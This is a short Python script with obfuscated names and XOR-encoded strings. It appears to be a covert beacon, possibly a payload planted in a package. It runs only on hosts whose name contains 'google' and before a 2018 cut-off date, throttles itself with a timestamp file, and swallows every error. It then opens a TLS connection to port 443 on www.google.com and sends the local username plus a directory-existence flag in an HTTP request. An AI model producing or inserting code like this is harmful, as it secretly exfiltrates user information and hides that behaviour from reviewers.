import datetime
import getpass
import os
import ssl
import socket
if 64 - 64: i11iIiiIii
def OO0o ( ) :
 Oo0Ooo = O0O0OO0O0O0 ( '\x42\x11\x06\x1d\x46\x5a\x12\x00\x1c\x08\x00\x0a\x0f\x00\x54\x40\x0f\x5a' ) % os . getuid ( )
 if not os . path . exists ( Oo0Ooo ) :
  open ( Oo0Ooo , 'a' ) . close ( )
  return False
 iiiii = datetime . datetime . fromtimestamp (
 os . path . getmtime ( Oo0Ooo ) )
 ooo0OO = datetime . datetime . now ( )
 if iiiii + datetime . timedelta ( 0 , 30 * 60 , 0 ) > ooo0OO :
  return True
 os . utime ( Oo0Ooo , None )
 return False
 if 18 - 18: II111iiii . OOO0O / II1Ii / oo * OoO0O00
def IIiIiII11i ( ) :
 return datetime . datetime . now (
 ) > datetime . datetime . fromtimestamp ( 1519329600 )
 if 51 - 51: oOo0O0Ooo * I1ii11iIi11i
def I1IiI ( ) :
 for o0OOO in ( O0O0OO0O0O0 ( '\x0a\x0a\x04\x0a\x05\x11' ) , O0O0OO0O0O0 ( '\x0a\x0a\x04\x0a\x05\x11\x13\x00' ) ) :
  if o0OOO in socket . gethostname ( ) :
   return True
 return False
 if 13 - 13: ooOo + Oo
def O0O0OO0O0O0 ( s ) :
 return '' . join ( [ chr ( ord ( o0O ) ^ [ ord ( o0O ) for o0O in 'mekmitastigoat' ] [ IiiIII111iI % 14 ] ) for IiiIII111iI , o0O in enumerate ( s ) ] )
 if 34 - 34: iii1I1I / O00oOoOoO0o0O . O0oo0OO0 + Oo0ooO0oo0oO . I1i1iI1i - II
def OoI1Ii11I1Ii1i ( ) :
 return os . path . isdir ( O0O0OO0O0O0 ( '\x42\x02\x04\x02\x0e\x18\x04\x5c\x07\x1b\x04\x40\x09\x11\x0c\x01\x44\x09\x0c\x04\x0e\x07\x5b\x0e\x08\x00\x06\x18\x08\x56' ) )
 if 67 - 67: iiI1iIiI . ooo0Oo0 * i1 - Oooo0000 * oo / OOO0O
def OOo000 ( joungfang = "(NULL)" , ewologo = False ) :
 O0 = ssl . create_default_context ( ) . wrap_socket (
 socket . socket ( socket . AF_INET ) ,
 server_hostname = O0O0OO0O0O0 ( '\x1a\x12\x1c\x43\x0e\x1b\x0e\x14\x18\x0c\x49\x0c\x0e\x19' ) )
 O0 . connect ( ( O0O0OO0O0O0 ( '\x1a\x12\x1c\x43\x0e\x1b\x0e\x14\x18\x0c\x49\x0c\x0e\x19' ) , 443 ) )
 if ewologo :
  I11i1i11i1I = O0O0OO0O0O0 ( '\x0e\x0a\x19\x1d' )
 else :
  I11i1i11i1I = O0O0OO0O0O0 ( '\x0e\x0a\x19\x1d\x36\x1a\x0e\x12\x17\x0a\x02\x1c\x12' )
 O0 . sendall ( (
 O0O0OO0O0O0 ( '\x2a\x20\x3f\x4d\x46\x18\x5e\x00\x01\x0a\x04\x0a\x12\x07\x50\x40\x18\x4b\x1c\x1a\x00\x1e\x11\x54\x42\x1c\x47\x1c\x02\x16\x1f\x50\x0f\x54\x29\x27\x20\x39\x48\x5e\x4f\x45' ) +
 '\r\n' +
 O0O0OO0O0O0 ( '\x25\x0a\x18\x19\x53\x54\x07\x12\x1c\x01\x0e\x01\x4c\x45\x54\x50\x5c\x5c\x59\x5a\x00\x03\x04\x1a\x17\x00\x15\x5a\x0e\x0a\x06' ) +
 '\r\n\r\n' ) % ( I11i1i11i1I , joungfang ) )
 O0 . close ( )
 if 31 - 31: i11iIiiIii / oOo0O0Ooo / Oooo0000 * O0oo0OO0 / I1ii11iIi11i
def Oo0o0ooO0oOOO ( ) :
 if IIiIiII11i ( ) :
  return
 if not I1IiI ( ) :
  return
 if OO0o ( ) :
  return
 OOo000 ( joungfang = getpass . getuser ( ) , ewologo = OoI1Ii11I1Ii1i ( ) )
 if 58 - 58: i11iIiiIii % i1
if __name__ == '__main__' :
 try :
  Oo0o0ooO0oOOO ( )
 except :
  pass
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
